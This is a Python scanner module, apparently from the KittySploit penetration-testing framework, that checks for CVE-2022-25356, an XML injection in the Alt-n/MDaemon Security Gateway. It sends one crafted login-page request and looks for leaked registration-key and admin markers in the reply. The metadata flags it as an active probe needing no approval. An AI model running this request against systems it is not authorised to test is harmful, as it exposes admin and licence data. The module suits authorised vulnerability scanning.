#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Alt-n/MDaemon Security Gateway through 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Alt-n/MDaemon Security Gateway <=8.5.0 - XML Injection Detection',
        'description': 'Alt-n/MDaemon Security Gateway through 8.5.0 is susceptible to XML injection via SecurityGateway.dll?view=login. An attacker can inject an arbitrary XML argument by adding a new parameter in the HTTP request URL. As a result, the XML parser fails the validation process and discloses information such as protection used (2FA), admin email, and product registration keys.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'altn', 'gateway', 'xml', 'injection', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.swascan.com/security-advisory-alt-n-security-gateway/',
            'https://www.altn.com/Products/SecurityGateway-Email-Firewall/',
            'https://www.swascan.com/security-blog/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-25356',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-25356',
    }

    def run(self):
        r = self.http_request(method="GET", path='/SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Exception: Error while [Loading XML', '&lt;RegKey&gt;', '&lt;IsAdmin&gt;',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Alt-n/MDaemon Security Gateway <=8.5.0 - XML Injection detected",
                path='/SecurityGateway.dll?view=login&redirect=true&9OW4L7RSDY=1',
            )
            return True
        return False

